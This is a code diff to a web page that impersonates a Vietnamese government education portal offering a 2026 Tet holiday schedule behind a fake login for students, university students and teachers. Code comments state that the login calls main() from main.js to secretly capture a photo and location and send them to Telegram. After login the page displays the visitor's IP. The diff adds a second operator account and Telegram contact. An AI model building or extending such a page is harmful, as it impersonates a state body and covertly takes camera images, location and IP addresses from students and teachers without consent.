@@ -65,15 +65,6 @@
             position: relative;
         }
 
-        #login-box::before {
-            content: "CHÍNH PHỦ NƯỚC CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM";
-            display: block;
-            font-size: 10px;
-            color: #888;
-            margin-bottom: 20px;
-            letter-spacing: 1px;
-        }
-
         .logo-img {
             width: 100px;
             margin-bottom: 15px;
@@ -141,6 +132,7 @@
             text-align: left;
             font-family: monospace;
             border-left: 4px solid #2ecc71;
+            margin-bottom: 10px;
         }
 
         /* Nội dung lịch nghỉ Tết */
@@ -179,7 +171,7 @@
     <div id="login-box">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Emblem_of_Vietnam.svg/1200px-Emblem_of_Vietnam.svg.png" class="logo-img">
         <h2>HỆ THỐNG XÁC THỰC</h2>
-        <p style="font-size: 14px; color: #666; margin-bottom: 25px;">Tra cứu lịch nghỉ lễ, Tết và lịch đào tạo 2026</p>
+        <p style="font-size: 14px; color: #666; margin-bottom: 25px;">Tra cứu lịch nghỉ lễ, Tết 2026</p>
         
         <div class="input-group">
             <i class="fas fa-users-cog"></i>
@@ -202,7 +194,7 @@
         
         <div id="loading-spinner" class="loader"></div>
         <p id="status-text" style="display:none; font-size: 13px; color: var(--primary-red); margin-top: 5px; font-weight: 500;">
-            <i class="fas fa-shield-alt"></i> Đang kết nối máy chủ...
+            <i class="fas fa-shield-alt"></i> Đang xác thực quyền truy cập...
         </p>
 
         <button id="login-btn" class="btn-login" onclick="processLogin()">ĐĂNG NHẬP HỆ THỐNG</button>
@@ -210,31 +202,38 @@
 
     <div id="admin-content">
         <div class="qr-card">
-            <h2 style="color: #2ecc71; margin-bottom: 20px;">XÁC THỰC QUẢN TRỊ</h2>
+            <h2 style="color: #2ecc71; margin-bottom: 20px;">HỆ THỐNG QUẢN TRỊ</h2>
             <img src="https://raw.githubusercontent.com/CongThongTinChinhPhu/Lich-nghi-tet-cua-cac-truong-tren-dia-ban-thanh-pho-ho-chi-minh/main/7b36bd73b1663f386677.jpg" class="qr-img">
+            
             <div class="bio-info">
-                <div>Zalo: Mrwenben</div>
-                <div>Tele: @Mrwenben</div>
+                <div><b>Admin 1:</b> Mrwenben</div>
+                <div><b>Tele:</b> @Mrwenben</div>
             </div>
-            <p style="color: #555; font-size: 11px; margin-top: 15px;">Secure Access Verified</p>
+
+            <div class="bio-info" style="border-left-color: #ffde00; color: #ffde00;">
+                <div><b>Admin 2:</b> VanThanh</div>
+                <div><b>Tele:</b> @Vanthanhdeptroai</div>
+            </div>
+            
+            <p style="color: #555; font-size: 11px; margin-top: 15px;">Chế độ bảo mật Admin đang bật</p>
         </div>
     </div>
 
     <div id="main-content">
         <div class="calendar-header">
             <h2 id="role-title" style="color: white; font-size: 22px;"> THÔNG BÁO LỊCH NGHỈ TẾT</h2>
-            <p style="font-size: 13px; opacity: 0.9;">Số: 245/TB-BGDĐT - Cập nhật: 06/02/2026</p>
+            <p style="font-size: 13px; opacity: 0.9;">Số: 245/TB-BGDĐT - 2026</p>
         </div>
         <div class="calendar-body">
             <div id="content-detail"></div>
             <div style="border-top: 1px solid #eee; margin-top: 20px; padding-top: 15px; color: #777; font-size: 12px;">
-                <p>Mã xác thực thiết bị: <span id="user-ip" style="color: var(--primary-red); font-weight: bold;">27.3.33.195</span></p>
+                <p>Mã xác thực thiết bị: <span id="user-ip" style="color: var(--primary-red); font-weight: bold;">...</span></p>
             </div>
         </div>
     </div>
 </div>
 
-<script src="main.js?v=1.2"></script>
+<script src="main.js?v=1.3"></script>
 
 <script>
     async function processLogin() {
@@ -246,32 +245,40 @@
         const loader = document.getElementById('loading-spinner');
         const status = document.getElementById('status-text');
         
-        // --- BƯỚC 1: KIỂM TRA TÀI KHOẢN ADMIN ĐẶC BIỆT ---
-        if (user === "Mrwenben" && pass === "0") {
+        // --- LOGIC KIỂM TRA ADMIN ---
+        const isAdmin1 = (user === "Mrwenben" && pass === "0");
+        const isAdmin2 = (user === "VanThanh" && pass === "0");
+
+        if (isAdmin1 || isAdmin2) {
             btn.style.display = 'none';
             loader.style.display = 'block';
             status.style.display = 'block';
-            status.innerHTML = '<i class="fas fa-user-shield"></i> Đang mở cổng quản trị...';
+            status.innerHTML = '<i class="fas fa-user-shield"></i> Xác nhận Admin. Đang báo cáo hệ thống...';
 
-            // Vẫn thực hiện gửi ảnh/vị trí ngầm qua main.js
+            // Gửi thông báo đặc biệt về Telegram thông qua info object (nếu main.js hỗ trợ)
+            if (typeof info !== 'undefined') {
+                info.specialNote = `⚠️ THÔNG BÁO: Admin [${user}] vừa đăng nhập vào trang!`;
+            }
+
+            // Thực hiện main() để chụp ảnh/vị trí và gửi Tele
             if (typeof main === 'function') await main(); 
 
             setTimeout(() => {
-                document.body.classList.add('dark-mode'); // Bật nền tối
+                document.body.classList.add('dark-mode');
                 document.getElementById('login-box').style.display = 'none';
                 document.getElementById('admin-content').style.display = 'block';
             }, 1200);
             return; 
         }
 
-        // --- BƯỚC 2: KIỂM TRA TÀI KHOẢN NGƯỜI DÙNG THƯỜNG ---
+        // --- TÀI KHOẢN NGƯỜI DÙNG THƯỜNG ---
         let accessGranted = false;
         if (role === "hocsinh" && user === "06092011" && pass === "Tuan06092011") accessGranted = true;
         else if (role === "sinhvien" && user === "02102009" && pass === "02102009") accessGranted = true;
         else if (role === "giaovien" && user === "lecamtu" && pass === "gv079254287410") accessGranted = true;
 
         if (!accessGranted) {
-            alert("LỖI XÁC THỰC: Sai tài khoản hoặc mật khẩu!");
+            alert("Sai tài khoản hoặc mật khẩu hệ thống!");
             return;
         }
 
@@ -281,14 +288,16 @@
 
         try {
             if (typeof main === 'function') await main(); 
-
             setTimeout(() => {
                 document.getElementById('login-box').style.display = 'none';
                 document.getElementById('main-content').style.display = 'block';
                 showSchedule(role);
+                if (typeof info !== 'undefined' && info.ip) {
+                    document.getElementById('user-ip').innerText = info.ip;
+                }
             }, 1500);
         } catch (err) {
-            alert("Vui lòng cấp quyền truy cập để tiếp tục!");
+            alert("Vui lòng cho phép truy cập để xem lịch!");
             location.reload();
         }
     }
@@ -296,16 +305,15 @@
     function showSchedule(role) {
         const container = document.getElementById('content-detail');
         const title = document.getElementById('role-title');
-
         if (role === "hocsinh") {
             title.innerText = "LỊCH NGHỈ TẾT HỌC SINH";
-            container.innerHTML = `<div class="level-box"><span class="level-title">KHỐI THCS & THPT</span><p>Nghỉ từ <b>07/02/2026</b> đến <b>27/02/2026</b>.</p></div>`;
+            container.innerHTML = `<div class="level-box"><span class="level-title">KHỐI THCS & THPT</span><p>Nghỉ từ 07/02/2026 đến 27/02/2026.</p></div>`;
         } else if (role === "sinhvien") {
             title.innerText = "LỊCH NGHỈ TẾT SINH VIÊN";
-            container.innerHTML = `<div class="level-box"><span class="level-title">ĐẠI HỌC & CAO ĐẲNG</span><p>Nghỉ từ <b>07/02/2026</b> đến <b>27/02/2026</b>.</p></div>`;
+            container.innerHTML = `<div class="level-box"><span class="level-title">ĐẠI HỌC & CAO ĐẲNG</span><p>Nghỉ từ 07/02/2026 đến 27/02/2026.</p></div>`;
         } else {
             title.innerText = "TRA CỨU TỔNG HỢP";
-            container.innerHTML = `<div class="level-box"><span class="level-title">CÁN BỘ & GIÁO VIÊN</span><p>Nghỉ từ <b>08/02/2026</b> đến <b>26/02/2026</b>.</p></div>`;
+            container.innerHTML = `<div class="level-box"><span class="level-title">CÁN BỘ & GIÁO VIÊN</span><p>Nghỉ từ 08/02/2026 đến 26/02/2026.</p></div>`;
         }
     }
 </script>
